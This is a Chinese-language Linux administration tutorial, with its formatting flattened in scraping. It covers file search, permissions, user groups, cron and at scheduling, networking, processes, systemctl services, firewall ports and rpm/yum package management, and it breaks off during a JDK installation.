haha.txt info.txt mycal myroot text.txt zwj[root@andu01 home]# cd myroot/[root@andu01 myroot]# 删除软连接myroot rm /home/myroot 注意：：当我们使用pwd指令查看目录时，仍然可以看到的时软链接所在目录 history 查看历史执行过的命令 history 查看所有 history 10 最近执行的10条 history !5 执行曾经执行过的第5条指令 时间日期类data 显示当前日期 date 显示当前时间 date +%Y 显示当前年份 date +%m 显示当前月份 date +%d 显示当前是哪一天 date “+%Y-%m-%d %H:%M:%S” 侠士年月日时分秒 cal 查看日历 cal 显示本月日历 cal 2020 显示2020年日历 搜索查找类find 查找 find指令将从指定目录下向下递归地遍历其各个子目录，将满足条件的文件或者目录显示在终端 find [搜索范围] [选项] 选项 功能 -name&lt;查询方式&gt; 按照指定的文件名查找模式查找文件 -user&lt;用户名&gt; 查找属于指定用户名所有文件 -size&lt;文件大小&gt; 按照指定的文件大小查找文件 案例： 按文件名：根据名称查找/home目录下的hello.txt文件 find /home -name hello.txt 按拥有者：查找/opt目录下，用户名称为nobody的文件 find /opt -user nobody 查找整个linux系统下大于200M的文件(+n大于 -n大于 n等于，单位有K、M、G) find / -size +200M locate 快速定位文件路径 locate指令可以快读定位文件路径。kicate指令利用用实现建立的系统中的所有文件名称以及路径的locate数据库实现快速定位给定的文件，locate指令无须遍历整个文件系统，查询速度较快。为了保证查询结果的准确性，管理员必须定期更新locate时刻 locate 搜索文件 由于locate指令基于数据库进行查询，所以，第一次运行之前，必须使用updatedb指令创建locate数据库。 案例： 请使用locate指令快速定位hello.txt文件所在目录 1234[root@andu01 CentOS 7 x86_64]# updatedb[root@andu01 CentOS 7 x86_64]# locate hello.txt/hello.txt/www/bbb/hello.txt which 查看某个指令在哪个目录下 which 命令 which ls grep和管道符号| grep过滤查找，管道符号。”|”，表示将前一个命令的处理结果输出传递给后面的命令处理 基本语法： grep [选项] 查找内容 源文件 常用选项： 选项 功能 -n 显示匹配行及行号 -i 忽略字母大小写 应用案例： 请在hello.txt文件中，查找”yes”所在行，并且显示行号 cat hello.txt | grep yes 12[root@andu01 bbb]# cat hello.txt | grep yesyes My name is Bi Jizhuang 不使用管道符号的方式 grep yes hello.txt 显示行号的写法 cat hello.txt | grep -n yes 压缩和解压类gzip/gunzip gzip是用于压缩文件，gunzip用来解压文件 gzip 压缩文件，之恩将文件压缩为*.gz文件 gunzip 解压缩文件命令 gzip压缩，将/home下的haha.txt文件进行压缩 gzip /home/haha.txt 解压 gunzip haha.txt.gz zip/unzip zip用于压缩文件，unzip用于解压 zip [选项] xxx.zip 压缩 unzip [选项] xxx.zip 解压 zip常用选项： -r：递归压缩，即压缩目录 unzip常用选项： -d&lt;目录&gt;：指定解压后文件的存放目录 将/home文件夹下的所有文件压缩成myhome.zip zip -r myhome.zip /home 将myhome.zip解压到/opt/tmp目录下 unzip myhome.zipi -d /opt/tmp tar 打包/解压 tar命令是打包指令，最后打包后的文件是.tar.gz的文件 tar [选项] xx.tar.gz 打包的内容 选项 功能 -c 产生tar打包文件 -v 显示详细信息 -f 之后顶压缩后的文件名 -z 打包同时压缩 -x 解压tar文件 压缩多个文件将/home/pig.txt 和 /home/cat.txt 压缩成pc.tar.gz tar -zcvf pc.tar.gz /home/pig.txt /home/cat.txt 将/home压缩成myhome.tar.gz tar -zcvf myhome.tar.gz /home 将pc.tar.gz解压到当前目录 tar -zxvf pc.tar.gz 将myhome.tar.gz解压到/opt/tmp2目录下 tar -zxvf home.tar.gz -C /opt/tmp2 Linux组在linux中的每个用户必须属于一个组，不能独立于组外，在Linux中每个文件有所有者、所在者、其他组的概念 1、所有者 2、所在组 3、其他组 比如有一个hello.txt文件，它是andu用户创建的，andu就是hehllo.txt的所有者，也可以将hello.txt的所有者修改为andew 当然，由于hello.txt的创建者 andu是组 tencent的，则hello.txt的所在组就是tencent，该tencent组下的用户则拥有hello.txt的权限 还有一个ali组，则hello.txt相对于ali的关系就是其他组 每个用户都属于一个组 文件/目录所有者一般为文件的创建者，谁创建了该文件，就自然称为该文件的所有者 查看文件的所有者指令：ls -ahl 修改文件的所有者chown 用户名 文件名修改apple.txt的文件所有者为anduchown andu apple.txt 组的创建groupadd 组名 创建组master groupadd master 创建用户bjz，放入master组内 useradd -g master bjz 文件/目录所在组当某个用户创建了一个文件之后，这个文件的所在组就是该用户所在的组 使用bjz创建一个文件，看看这个文件所在的组 创建文件 touch banana.txt 查看文件信息 ll 修改文件所在的组 chgrp 组名 文件名 使用root用户创建文件orange.txt，看看当前这个文件属于哪个组，然后将这个文件所在组，修改到fruit组 创建组 groupadd fruit 创建文件 orange.txt 查看文件组信息 ll chgrp fruit orange.txt 其他组除文件的所有者和所在组的用户外，系统的其他用户都是文件的其他组 改变用户所在组在添加用户时，可以指定将该用户添加到哪个组中，同样的用root的管理权限可以改变某个用户所在的组 改变用户所在的组： usermod -g 组名 用户名 usermod -d 目录名 用户名 改变该用户登录的初始目录 Linux权限权限的基本介绍ls -l中显示的内容如下： drwx——. 15 andu andu 4096 9月 15 13:19 abc 0-9位说明： 第0位确定文件类型(d, -, l, c ,b)l是链接，相当于windows的快捷方式d是目录，相当于windows的文件夹c是字符设备文件，鼠标，键盘b是块设备，比如硬盘 是一个文件(txt、zip、png…) 第1-3位确定所有者(该文件的所有者)拥有该文件的权限，—User 第4-6位确定所属组(同用户组的)拥有该文件的权限，—Group 第7-9位确定其他用户拥有该文件的权限 —Other 在Linux中权限也可以使用数字表示：r=4，w=2，x=1 因此rwx=4 + 2 + 1 = 7 其他说明： 15 文件：硬连接数或目录：子目数 andu 用户 andu 用户组 4096 文件大小(字节)，如果是文件夹，显示4069字节 9月 15 13:19 最后修改日期 abc 文件名 rwx rwx作用到文件 1、[r]代表可读(read)：可以读取，查看 2、[w]代表可写[write]：可以修改，但是不代表可以删除该文件，删除一个文件的前提条件是对该文件所在的目录有写权限，才能删除该文件 3、[x]代表可执行(execute)：可以被执行 rwx作用到目录 1、[r]代表可读(read)：可以读取，ls查看目录内容 2、[w]代表可写(write)：可以修改，对目录内创建+删除+重命名目录 3、[x]代表可执行(execute)：可以进入该目录 修改权限通过chmod指令，可以修改文件或者目录的权限 第一种方式：+、-、= 变更权限： u：所有者 g：所有组 o：其他人：a：所有人(u、g、o的总和) 1、chmod u=rwx,g=rx,o=x 文件/目录名 2、chmod o+w 文件/目录名 3、chmod a-x 文件/目录名 案例： 1、给abc文件的所有者读写执行的权限，给所在组读执行权限，给其他组读执行权限 chmod u=rwx,g=rx,o=rx abc 2、给abc文件的所有者除去执行的权限，增加组写的权限 chmod u-x,g+w abc 3、给abc文件的所有用户添加读的权限chmod a+r abc 第二种方式：通过数字变更权限 12r=4 w=2 x=1 rwx=4+2+1=7chmod u=rwx,g=rx,o=x 文件目录名 相当于 chmod 751 案例： 1、将/home/abc.txt文件的权限系改成rwxr-xr-x，使用给数字的方式实现 1chmod 755 /home/abc.txt 修改文件/目录所有者chown newowner 文件/目录 改变所有者 chown newowner:newgroup 文件/目录 改变所有者和所在组 -R 如果是目录 则使其下所有子文件或目录递归生效 案例： 1、将/home/abc.txt文件的所有者系改成tom 1chown tom /home/abc.txt 2、将/home/kkk目录下所有的文件和目录的所有者修改成tom 1chown -R tom /home/kkk 修改文件/目录所在组chgrp newgroup 文件/目录 改变所在组 案例： 将/home/abc.txt文件的所在组修改成shaolin(少林) 12groupadd shaolinchgrp shaolin /home/abc.txt 将/home/kkk目录下所有的文件和目录的所在组都修改成shaolin(少林) 1chgrp -R shaolin /home/kkk 权限管理实践警察和土匪游戏 警察组(police) 土匪组(bandit) jack xh jerry xq 1、创建组 1groupadd police groupbandit 2、创建用户 12useradd -g police jack useradd -g police jerryuseradd -g bandit xh useradd -g bandit xq 3、jack创建一个文件，自己可以读写 首先jack登录 12vim jack.txtchmod 640 jack.txt 4、jack修改该文件，让其他组人可以读，本组人可以读写 1chmod 644 jack.txt 或者 chmod o=r,g=r jack.txt 5、xh投靠警察 1usermod -g police xh 6、看看xh和xq是否可以读写该文件，小结论：如果要对目录内的文件进行操作，需要先有对该目录的相应权限 1chmod 770 /home/jack 西游记案例1、建立两个组：神仙(sx)、妖怪(yg) 12groupadd sxgroupadd yg 2、建立四个用户（唐僧、悟空、八戒、沙僧） 1234useradd tsuseradd wkuseradd bjuseradd ss 3、设置密码密码统一设置为用户名4、把悟空、八戒放入妖怪，唐僧、沙僧放入神仙组 1234usermod -g yg wkusermod -g yg bjusermod -g sx tsusermod -g sx ss 5、用悟空创建一个文件（monkey.java 该文件要输出i am monkey）登录 vim monkey.java5、给八戒一个可以rw的权限因为八戒和悟空是同一个组的，所以给当前组添加写的权限就OK 1chmod g+w monkey.java 6、八戒修改monkey.java加入一句话(i am pig) 12[bj@andu01 ~]$ cd /home/wk-bash: cd: /home/wk: 权限不够 发现wk这个目录进不去也是无法修改文件的所以我们要对该目录进行权限修改 1234chmod g+r+w+x wk // 将wk当前组的权限修改为读写执行cd /home/wkvim monkey.java 7、把沙僧放入妖怪组此时沙僧还是无法进入wk目录 12345[ss@andu01 /]$ cd /home/wk-bash: cd: /home/wk: 权限不够// 我们将沙僧修改为妖怪组usermod -g yg ss 然后看一看沙僧是否可以进入wk的文件夹 12[ss@andu01 /]$ cd /home/wk-bash: cd: /home/wk: 权限不够 发现还是进不去，很奇怪！ 进不去的原因是因为沙僧，在登录之前是神仙组，然后在沙僧的登录过程中，root用户修改了沙僧的权限，所以，沙僧自己都没有反应过来自己的组被修改了，所以当然是无法进入自己组的用户共享的目录，所以我们要做的就是，重新登录沙僧账户，然后组状态才会重新加载 8、沙僧修改monkey.javavim /home/wk/monkey.java 细节分析：假如此时，我们使用root用户对wk目录的权限进行修改 12345# 组的所有权限都移除chmod g-r-w-x wk# 添加执行权限chmod g+x wk 然后我们使用悟空同组的八戒登录，并且尝试进入wk目录 123[bj@andu01 /]$ cd /home/wk[bj@andu01 wk]$ lsls: 无法打开目录.: 权限不够 发现是可以进去的(因为有了x权限)，但是不能使用ls访问该文件夹下的文件但是此时，我们虽然看不见此目录下有哪些文件，但是我们知道该目录下有个monkey.java文件，我们尝试修改一下这个文件 1[bj@andu01 wk]$ vim monkey.java 结果是可以正常修改文件的！！！这是因为，我们虽然对wk这个目录只赋予了x的权限，但是wk目录内的文件monkey.java，确是有着本组用户可以读取和修改的权限的 123456789101112-rw-rw-r--. 1 wk yg 92 9月 17 14:46 monkey.java# 当然，直接使用cat查看也是可以的[bj@andu01 wk]$ cat monkey.javai am monkeyi an pig我是沙僧，我现在是妖怪了！八戒来偷吃西瓜了！ 此时，我们使用root用户或者悟空把wk这个目录的读取权限在开放给本组的 用户 1[root@andu01 /]# chmod g+r /home/wk 然后现在八戒是可以正常读取到该目录下的文件的，ls是针对于目录的权限 1234[bj@andu01 home]$ cd wk[bj@andu01 wk]$ ll总用量 4-rw-rw-r--. 1 wk yg 92 9月 17 14:46 monkey.java 现在因为monkey.java对本组开放了写的权限，我们尝试一下操作 12[bj@andu01 wk]$ rm monkey.javarm: 无法删除&quot;monkey.java&quot;: 权限不够 我们发现，拥有写权限并不代表可以创建或者删除，而是可以修改 如果我们此时尝试再wk目录下创建ok.txt呢？ 123# 这里创建文件的权限是针对于wk目录的[bj@andu01 wk]$ touch ok.javatouch: 无法创建&quot;ok.java&quot;: 权限不够 因为wk文件夹没有对本组开放写的权限，所以导致无法创建文件我们此时再使用悟空对wk目录进行本组写的权限开放，然后再尝试再wk目录下创建ok.txt文件 1234[root@andu01 /]# chmod g+w /home/wk[bj@andu01 wk]$ touch ok.txt[bj@andu01 wk]$ 此时是可以正常创建文件的(在Linux中，无输出内容则表示命令执行成功) 对文件夹rwx的细节分析： x表示可以进入到该目录，比如cd r表示可以ls，将目录的内容显示 w表示可以在该目录删除或者创建文件 定时任务调度crond任务调度crontab进行 定时任务的设置概述：任务调度：是指系统在某个时间主席那个的特定的命令或程序任务调度分类： 系统工作：有些重要的工作必须周而复始地执行，如病毒扫描等 个别用户工作：个别用户工作可能希望执行某些程序，比如对MySQL数据库的备份。 基本语法：crontab [选项] 选项 说明 -e 编辑crontab定时任务 -l 查询crontab任务 -r 删除当前用户所有的crontab任务 快速入门设置任务调度文件：/etc/crontab设置个人任务调度：执行crontab -e 命令接着输入需要执行的任务到调度文件如：*/1 * * * * ls -l /etc/ &gt; /tmp/to.txt意思说每小时的每分钟执行ls -l /etc/ &gt; /tmp/to.txt 命令 参数细节说明： 项目 含义 范围 第一个 * 一小时当中的第几分钟 0-59 第二个 * 一天当中的第几小时 0-23 第三个 * 一个月当中的第几天 1-31 第四个 * 一年当中的第几月 1-12 第五个 * 一周当中的星期几 0-7（0-7都代表星期日） 特殊符号说明 特殊符号 含义 * 代表任何时间。比如第一个 “*” 就代表一小时中每分钟都能执行一次的意思 , 代表不连续的时间。比如 “0 8,12,16 * * * “命令，代表在每天的8点0分，12点0分，16点0分都执行一次命令 - 代表连续的时间范围。比如” 0 5 * * 1-6 “命令，代表在周一到周六的凌晨5点0分执行命令 */n 代表每隔多久执行一次，比如 “ */10 * * * * “命令，代表每隔10分钟就执行一遍命令 特定时间执行任务案例 时间 含义 45 22 * * * 在22点45分执行命令 0 17 * * 1 每周1的17点0分执行命令 0 5 1,15 * * 每月1号和15号的凌晨5点0分执行命令 40 4 * * 1-5 每周一到周五的凌晨4点40分执行命令 */10 4 * * * 每天的凌晨4点，每隔10分钟执行一次命令 0 0 1,15 * 1 每月1号和15号，每周1的0点0分都会执行命令。注意：星期几和几号最好不要同时出现，因为他们定义的都是天。非常容易让管理员混乱。 任务调度实例每隔一分钟就将当前的日期信息，追加到/tmp/mydate文件中 1*/1 * * * * date &gt;&gt; /tmp/date 每隔1分钟，就将当前日期和日历都追加到/home/mycal文件中 1234567# 编写shell脚本 my.shdate &gt;&gt; /tmp/mycalcal &gt;&gt; /tmp/mycal# 设置定时任务crontab -e*/10 * * * * /home/my.sh 每天凌晨2:00将MySQL数据库 testdb备份到文件中。 10 2 * * * mysqldump -uroot -phelloworld testdb &gt; /home/db.bak crond相关指令： crontab -r：终止任务调度 crontab -l：列出当前有哪些任务调度 service crond restart [重启任务调度] at定时任务1、at命令是一次性定时计划任务，at的守护进程atd会以后台模式运行，检查作业队列来运行2、默认其工况下，atd守护进程每60秒检查作业队列，有作业时，会检查作业运行时间，如果时间与当前时间匹配，则运行此作业3、at命令时一次性定时计划任务，执行完了一个任务后不在执行此任务了4、在使用at命令的时候，一定要保证atd进程的启动，可以使用相关指令来查看ps -ef 检查当前所有在运行的进程ps -ef | grep atd 可以检查atd是否在运行 如果可以看到结果，表示atd正在运行 语法：at [选项] [时间]Ctrl + D 结束at命令的输入 命令选项： 选项 含义 -m 当指定的任务被完成后，将给用户发送又将，即使没有标准输出 -I atq的别名 -d atm的别名 -v 显示任务将被执行的时间 -c 打印任务的内容到标准输出 -V 显示版本信息 -q &lt;队列&gt; 使用指定的队列 -f &lt;文件&gt; 从指定文件读入任务而不是从标准输入读入 -t &lt;时间参数&gt; 以时间参数的形式提交到运行的任务 at指定时间的方法1、接受在当天的hh:mm(小时:分钟)式的时间指定。加入时间已过去，那么就放在第二天执行。例如：04:002、使用midnight（深夜），noon（中午），teatime(饮茶时间，一般时下午4点)等比较模糊的词语来指定时间。3、采用12小时制，即在时间后面加上AM（上午）或PM（下午）来说明时上午还是下午。例如：12pm4、指定命令执行的具体日期，指定格式为month day（月 日）或mm/dd/yy（月/日/年）或dd.mm.yy（日.月.年），指定的日期必须跟在指定时间的后面。例如：04:00 2021-09-175、使用相对计时法。指定格式为：now + count time-units，now就是当前时间，time-untis就是时间安慰，这里能够使minutes（分钟）、hour（小时）、day（天）、week（星期）。count时时间的数量，几天，几小时，例如：now + 5 minutes6、直接使用today（今天）、tomorrow（明天）来指定完成命令的时间 应用实例1、2天后的下午5点指定/bin/ls /home 1234at 5pm + 2 days# 回车之后输入任务/bin/ls /home# 然后使用两次Ctrl + D保存 2、atq命令来查看系统中没有指定的工作任务 1atq 3、明天17点钟，输出时间到指定文件内 比如/root/date100.log 123at 5pm tomorrowdate &gt; /root/date100.logCtrl + D * 2 4、2分钟后，输出时间到指定文件内 比如/root/date200.log 123at now + 2 minutesdate &gt; /root/date200.logCtrl + D * 2 5、删除已经设置的任务，atrm 编号 12# 比如此时要删除任务的编号为3atrm 3 Linux分区原理介绍：1、Linux来说无论有几个分区，分给哪一目录使用，它归根结底只有一个根目录，一个独立且唯一的文件结果，Linux中每隔分区都是用来组成整个文件系统的一部分2、Linux采用了一种叫 “载入” 的处理方法，它的整个文件系统在红包含了一整套的文件和目录，且将一个分区和一个目录联系起来，这是要载入的一个分区将使它的储存空间在一个目录下获得。 可以使用lsblk命令查看分区以及挂载情况： 1234567[root@andu01 ~]# lsblkNAME MAJ:MIN RM SIZE RO TYPE MOUNTPOINTsda 8:0 0 20G 0 disk├─sda1 8:1 0 1G 0 part /boot├─sda2 8:2 0 2G 0 part [SWAP]└─sda3 8:3 0 17G 0 part /sr0 11:0 1 4.4G 0 rom /run/media/root/CentOS 7 x86_64 硬盘说明：Linux硬盘分IDE硬盘和SCST硬盘，目前基本上是SCSI硬盘 磁盘挂载案例增加一块硬盘为例来熟悉下磁盘的相关指令和深入理解磁盘分区、挂载、卸载的概念。 如何添加一块硬盘：1、虚拟机添加硬盘2、分区3、格式化4、挂载5、设置可以自动挂载 略… 网络配置12345678# Linux下查看网络信息ifconfig# Windows下查看网络信息ipconfig# 检查主机与网络之间的互通性ping NAT网络原理图 网络环境配置第一种（自动获取）：Linux启动后会自动获取IP，缺点是每次自动获取的，IP地址可能不一样 第二种（指定IP）：直接修改配置文件来指定IP，并且可以连接到外网（程序员推荐）编辑：vi/etc/sysconfig/network-scripts/ifcfg-ens33要求：将ip地址配置为静态的，比如ip地址为：192.168.200.130 ifcfg-ens33文件说明： 123456789DEVICE=eth0 # 接口名(设备，网卡)HWADDR=00:0C:2x:6x:0x:xx # MAC地址TYPE=Ethernet # 网络类型(通常是Ethernet)UUID=xxx-xx-xx-xxx- # 通常是随机的ONBOOT=yes # 系统启动时候网络接口是否有效BOOTPROTO=static # IP的配置方法[none|static|bootp|dhcp](引实时不使用协议|静态分配IP|BOOTP协议|DHCP协议)IPADDR=192.168.200.130 # IP地址CATEWAY=192.168.200.2 # 网关DNS1=192.168.200.2 # 域名解析器 设置主机名和host映射设置主机名1、为了方便记忆，可以给Linux系统设置主机名，也可以根据需求修改主机名2、指令hostname，查看主机名3、修改文件在/etc/hostname指定4、修改后重启生效 设置Host映射如何通过主机名能够找到（比如ping）某个linux系统？ Windows：在C:\\Windows\\System32\\drivers\\etc\\hosts 文件指定即可案例：192.168.200.130 andu Linux：在/etc/hosts 文件指定案例：192.168.200.1 ZhanShen Linux进程1、在Linux中，每个执行的程序都称为一个进程。每一个进程都分配一个号（pid，进程号）。2、每隔进程都可能以两种方式存在，前台与后台，所以前台进程就是用户目前的屏幕上可以进行该操作的。后台进程则是实际在操作，但由于屏幕上无法看到的进程，通常使用后台方式执行。3、一般系统的服务都是在后台进程的方式存在，而且都会常驻在系统中。直到关机才结束。 显示系统执行的进程ps命令是用来查看目前系统中，有哪些正在执行，以及他们执行的情况。可以不加任何参数。 字段 说明 PID 进程识别号 TTY 终端名称 TIME 进程所消耗CPU时间 CMD 正在执行的命令或进程名 STAR S-睡眠，s-表示进程绘画的先导进程，N-表示进程拥有比普通优先级更低的优先级，R-正在运行，D-短期等待，Z-僵死进程，T-被跟踪或者被停止等等。 USER 执行进程的用户 %CPU 进程占用CPU的百分比 %MEM 进程占用物理内存的百分比 VSZ 进程占用的虚拟内存大小（单位：KB） RSS 进程占用的物理内存大小（单位：KB） COMMAND 启动进程所用的命令和参数，如果过长会被截断显示 ps -a：显示当前终端的所有进程信息ps -u：以用户的格式显示进程信息ps -x：显示后台进程运行的参数组合使用：ps -aux 显示系统执行的进程以全格式显示当前所有的进程，查看进程的父进程ps -ef是查看全格式显示当前所有的进程-e显示所有进程 -f全格式ps -ef | grep xxx 是BSD风格UID：用户IDPID：进程IDPPID：父进程IDC：CPU用于计算执行优先级的因子。数值越大，表示进程是CPU密集型运算，执行优先级会降低，数值越小，表示进程是I/O密集型运算，执行优先级会提高STIME：进程启动的时间TTY：完成的终端名称TIME：CPU时间CMD：启动进程所用的命令和参数 终止进程kill和killall若是某个进程执行一般需要停止时，或是已消了很大的系统资源时，此时可以考虑停止该进程，使用kill命令来完成此项任务。语法：kill [语法] 进程号（功能描述：通过进程号杀死/终止进程）killall 进程名称（功能描述：通过进程名杀死进程，也支持通配符，这在系统因负载过大而变得很慢的时候很有用）常用选项：-9：表示强迫进程立即停止 最佳实践：1、踢掉某个非法登录用户比如我们此时有个非法用户andu，他此时已经通过ssh连接到了服务器，我们现在可以：ps -aux | grep sshd然后查看andu对应的进程PID，使用kill PID使andu强制下线2、终止远程登录服务sshd，在适当的时候再次重启sshd服务终止：kill sshd进程id 重启：/bin/systemctl start sshd.service3、终止多个geditkillall gedit4、强制杀掉一个终端ps -aux | grep bashkill -9 bash进程id 查看进程树pstree [选项] 可以更加直观的查看进程信息-p：显示进程PID-u：显示进程的所属用户 服务管理服务本质就是进程，但是是在运行在后台的，通常都会监听某个端口，等待其他程序的请求，比如（mysqld、sshd、防火墙）等等。 服务管理指令1、service 服务名 [start | stop | restart | reload | status ]2、在CentOS7.0之后 很多服务不在使用service而是systemctl3、service指令管理的服务在/etc/init.d查看 123456[root@andu01 ~]# ls -l /etc/init.d/总用量 40-rw-r--r--. 1 root root 18281 5月 22 2020 functions-rwxr-xr-x. 1 root root 4569 5月 22 2020 netconsole-rwxr-xr-x. 1 root root 7928 5月 22 2020 network-rw-r--r--. 1 root root 1160 10月 2 2020 README 案例： 使用service指令，查看，关闭，启动network [注意：在续集系统演示，因为网络连接会关闭] 123456789101112# 查看服务状态service network status已配置设备：lo ens33当前活跃设备：lo ens33 virbr0# 停止服务service network stop# 启动服务service network start 注意：关闭之后ssh就无法连接此服务器了，直到重启network服务 查看服务名方式一：使用setup就可以看到全部服务 1234567891011[ ] saslauthd.service ↑ │[*] smartd.service ▒ │[ ] speech-dispatcherd.service ▒ │[*] sshd.service ▒ │[ ] sshd.socket ▒ │[ ] sssd-autofs.socket ▮ │[ ] sssd-nss.socket ▒ │[ ] sssd-pac.socket # 前面带*号的就是随着Linux系统的启动而启动的服务# 如果想修改 则需要把光标移动到星号位置 然后输入空格即可 方式二：/etc/init.d看到service命令管理的服务 服务的运行级别Linux系统有7中运行级别（runlevel）运行级别0：系统停机状态，系统默认运行级别不能设置为0，否则不能正常启动运行级别1：单用户工作状态，root权限，用于系统维护，禁止远程登陆运行级别2：多用户状态（没有NFS），不支持网络运行级别3：完全的多用户 状态（有NFS），无界面，登录后进入控制台命令行模式运行级别4：系统未使用，保留运行级别5：X11控制台，登录后进入图形GUI模式运行级别6：系统正常关闭并重启，默认运行级别不能设置为6，否则不能正常启动 一般比较经常使用的运行级别为3和5 开启流程说明：CentOS7后运行级别说明在/etc/initab尽心简化，如下： 123456789multi-user.target: analogousto runlevel 3graphical.target: analogous to runlevel 5 // 获取运行级别systemctl get-default // 设置运行级别systemctl set-default TARGET.target chkconfig指令介绍1、通过chkconfig命令可以给服务的各个运行级别设置自启动/关闭2、chkconfig指令管理的服务在/etc/init.d查看3、注意：CentOS7.0后，很多服务使用systemctl管理基本语法 12345# 查看服务chkconfig -- lsit [| grep xxx]chkconfig 服务名 --list# 修改服务的自启动状态chkconfig --level 5 服务名 on/off 对network服务修改运行级别为3并且关闭自启动 1chkconfig --level 3 network off chkconfig重新设置服务和偶自启动或关闭，需要重启机器reboot生效 systemctl服务管理systemctl管理指令1、基本语法：systemctl [start | stop | restart | status ] 服务名2、systemctl指令管理的服务在/usr/lib/systemd/system查看 systemctl设置服务的自启动状态1、systemctl list-unit-files [ | grep 服务名] (查看服务开机启动在黄台，grep可以进行过滤)2、systemctl enable 服务名（设置服务开机启动）3、systemctl disable 服务名(关闭服务开机启动)4、systemctl is-enabled 服务名(查询某个服务是否是自启动的) 应用案例查看当前防火墙的状况，关闭防火墙和重启防火墙 123456789101112131415161718192021222324# 查看防火墙服务的状态systemctl status firewalld# 关闭防火墙systemctl stop firewalld# 重启防火墙systemctl restart firewalld# 查看防火墙服务[root@andu01 /]# ls -l /usr/lib/systemd/system | grep fire-rw-r--r--. 1 root root 657 10月 1 2020 firewalld.service[root@andu01 /]# systemctl list-unit-files | grep firewalldfirewalld.service enabled# 设置服务开机启动systemctl enable firewalld# 关闭服务开机自启systemctl disbale firewalld# 查看防火墙是否开启启动systemctl -is-endabled firewalld 细节分析1、关闭或者启动防火墙后，立即生效。[telnet 测试 某个端口即可]2、这种方式只是临时生效，当重启系统后，还是回归以前对服务的设置3、如果希望设置某个服务自启动或关闭永久生效，要使用systemctl [enable | disable] 服务名. 打开或者关闭指定端口在真正的生产环境，往往需要将防火墙打开，但是问题来了，如果我们把防火墙打开，那么外部请求数据包就不能跟服务器见日你刚起端口通讯。这时，需要打开指定的端口。比如80、22、8080 等，这个又怎么做呢？ firewall打开端口：firewall-cmd --permanent --add-port=端口号/协议关闭端口：firewall-cmd --permanent --remove-port=端口号/协议重新载入才能生效：firewall-cmd --reload查询端口是否开放：firewall-cmd --query-port=端口/协议 应用案例1、启动防火墙，测试111端口是否能telnet 1telnet 192.168.234.130 111 2、开放111端口 1firewall-cmd --permanent --add-port=111/tcp 3、再次关闭111端口 123firewall-cmd --permanent --remove-port=111/tcpfirewall-cmd --reload 动态监控进程top与ps指令相似，他们都用来显示正在执行的进程。top与ps最大的不同之处，在于top在执行一段时间可以更新更新正在运行的进程。基本语法top [选项] 选项说明 选项 功能 -d 秒数 指定top指令每隔几秒更新。默认是3秒 -i 使top不显示任何限制或者僵死进程 -p 通过指定监控进程ID来仅仅监控某个进程的状态 交互操作说明 操作 功能 P 以CPU使用率排序，默认就是此项 M 以内存的使用率排序 N 以PID排序 q 退出top 12345678 # 当前时间 # 系统运行时间 #用户数量 # 负载均衡 top - 09:27:17 up 21 days, 11:58, 1 user, load average: 0.19, 0.18, 0.26# 任务数:总任务数 # 3个正在运行 #119个正在等待 # 0个已停止 Tasks: 123 total, 3 running, 119 sleeping, 0 stopped, 1 zombie# CPU占用情况%Cpu(s): 7.2 us, 2.1 sy, 0.0 ni, 90.8 id, 0.0 wa, 0.0 hi, 0.0 si, 0.0 stKiB Mem : 1882008 total, 85688 free, 784824 used, 1011496 buff/cacheKiB Swap: 1049596 total, 838140 free, 211456 used. 900512 avail Mem 应用实例1、监视特定用户top：输入此指令，按回车键，查看指定进程u：然后输入”u”回车，在输入用户名，即可 2、终止指定的进程top：输入此命令，按回车键，查看执行的进程k：然后输入”k”回车，再输入要结束的进程ID号在输入信号量为9(强制删除) 3、指定系统状态跟新的时间(跟新10秒自动更新)top -d 10 监控网络状态查看系统网路情况netstat基本语法netstat [选项]选项说明-an 按一定顺序排列输出-p 选手显示哪个进程在调用 123456789101112131415网络协议 本地地址 远程地址 状态Proto Recv-Q Send-Q Local Address Foreign Address Statetcp 0 0 0.0.0.0:6379 0.0.0.0:* LISTENtcp 0 0 0.0.0.0:80 0.0.0.0:* LISTENtcp 0 0 0.0.0.0:22 0.0.0.0:* LISTENtcp 0 0 0.0.0.0:8888 0.0.0.0:* LISTENtcp 0 0 0.0.0.0:888 0.0.0.0:* LISTENtcp 0 0 127.0.0.1:25 0.0.0.0:* LISTENtcp 0 0 0.0.0.0:443 0.0.0.0:* LISTEN Linux的本地IP 使用MobaXterm远程连接机器的IP(本机IP)tcp 0 0 10.0.4.10:22 61.163.127.93:22628 ESTABLISHEDtcp 0 0 10.0.4.10:51356 169.254.0.34:9988 ESTABLISHEDtcp 0 0 10.0.4.10:8888 89.248.165.52:51560 ESTABLISHEDtcp 0 0 10.0.4.10:8888 141.101.196.233:43560 ESTABLISHED 应用案例请查看服务名为sshd服务的信息netstat -anp | grep sshd 检测主机连接命令ping网络检测工具，它主要是用于检测远程主机是否正常，或者是两部主机之间的网线活着网卡故障。ping 对方ip地址ping 1.15.235.91 包管理rpmrpm用于互联网下载包的打包以及安装工具，它包含在某些Linux分发版中，它生成具有.RPM扩展名的文件。RPM是RedHat Package Manager（RedHat软件包管理工具）的缩写，类似鱼Windows的Setup.exe，这一文件格式名称虽然打上了RedHat的标志，但理念是通用的。Linux的分发版本都有采用(suse,redhat,centos等等)，可以算是工人的行业标准了。 查询查询已安装的rpm列表 1rpm -qa | grep xx 查看当前系统是否安装了火狐 1rpm -qa | grep firefox rpm包基本格式 12345rpm包名：firefox-60.2.2-1.el7.centos.x86_64名称: 60.2.21使用操作系统: el7.centos.x86_64表示centos7.x的64位系统如果是i686、i386表示32位系统，noarch表示通用 查询所安装的所有rpm软件包rpm -qa | more 查询软件包是否安装rpm -q firefox 查询软件包信息rpm -qi firefox 查询软件包中的文件rpm -ql firfox 文件全路径名 查询文件所属的软件包rpm -qf /etc/passwdrpm -qf /root/install.log 卸载rpm -e RPM包的名称删除firefox软件包rpm -e firefox 安装rmp-ivh RPM包全路径名称 参数i=install 安装v=verbose 提示h=hash 进度条 卸载和安装firefox浏览器 yumyum是一个Shell前端软件包管理器，依赖于RPM包管理，能够从指定的服务器自动下载RPM并且安装，可以自动处理依赖性关系，并且一次安装所有依赖的软件包。 查询yum服务器是否有需要安装的软件eayum list | grep 软件列表 123[root@andu01 /]# yum list | grep firefoxfirefox.i686 91.3.0-1.el7.centos updatesfirefox.x86_64 91.3.0-1.el7.centos updates 安装指定的yum包yum install xxx 使用yum安装firefox 1yum install firefox 安装JDKmkdir /opt/jdk将JDK安装包通过XFTP6上传到/opt/jdk下cd /opt/jdk解压 tar -zxvf jdk-8u261-linux-x64.tar.gzmkdir /usr/local/javamv /opt/jdk/jdk1.8.0_261 